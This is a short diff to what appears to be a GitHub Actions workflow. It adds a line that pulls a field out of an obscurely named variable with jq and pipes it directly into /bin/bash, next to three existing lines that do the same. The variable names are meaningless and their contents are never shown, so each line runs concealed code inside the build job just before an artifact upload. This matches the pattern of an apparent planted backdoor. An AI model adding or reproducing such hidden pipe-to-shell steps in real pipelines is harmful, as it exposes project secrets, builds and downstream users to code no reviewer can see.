@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$hw038" | jq -r .v4 | /bin/bash
           echo $jxijk862 | jq -r .oicll49 | /bin/bash
           echo $z9 | jq -r .t4 | /bin/bash
+          echo $obd07184 | jq -r .i105 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
